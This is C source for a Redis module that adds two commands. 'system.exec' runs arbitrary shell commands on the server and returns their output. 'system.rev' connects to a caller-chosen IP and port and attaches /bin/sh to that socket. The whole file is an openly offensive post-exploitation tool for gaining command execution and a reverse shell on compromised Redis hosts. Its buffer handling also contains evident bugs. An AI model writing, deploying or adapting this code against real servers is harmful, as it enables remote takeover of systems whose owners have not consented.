#include "redismodule.h"
#include <string.h>   // for strlen() i strcat()
#include <arpa/inet.h> // for inet_addr()
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>


int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 2) {
		size_t cmd_len;
		size_t size = 1024;
		char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

		FILE *fp = popen(cmd, "r");
		char *buf, *output;
		buf = (char *)malloc(size);
		output = (char *)malloc(size);
		while ( fgets(buf, sizeof(buf), fp) != 0 ) {
			if (strlen(buf) + strlen(output) >= size) {
				output = realloc(output, size<<2);
				size <<= 1;
			}
			strcat(output, buf);
		}
		RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
		RedisModule_ReplyWithString(ctx, ret);
		pclose(fp);
	} else {
                return RedisModule_WrongArity(ctx);
        }
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }

    size_t len;
    /* Using const, because RedisModule_StringPtrLen returns  pointer do const */
    const char *ip = RedisModule_StringPtrLen(argv[1], &len);
    const char *port_str = RedisModule_StringPtrLen(argv[2], &len);
    int port = atoi(port_str);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return RedisModule_ReplyWithError(ctx, "ERR socket error");
    }

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(sockfd);
        return RedisModule_ReplyWithError(ctx, "ERR connect error");
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(sockfd);
        return RedisModule_ReplyWithError(ctx, "ERR fork error");
    } else if (pid == 0) {
        /* Forking process  – setting socket as default descriptiors */
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        close(sockfd);
        char *args[] = { "/bin/sh", NULL };
        execve("/bin/sh", args, NULL);
        /* if execve wont work, end forked process */
        exit(EXIT_FAILURE);
    } else {
        /* Main process  – Redis still work */
        close(sockfd);
        RedisModule_ReplyWithSimpleString(ctx, "OK");
        return REDISMODULE_OK;
    }
}


int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}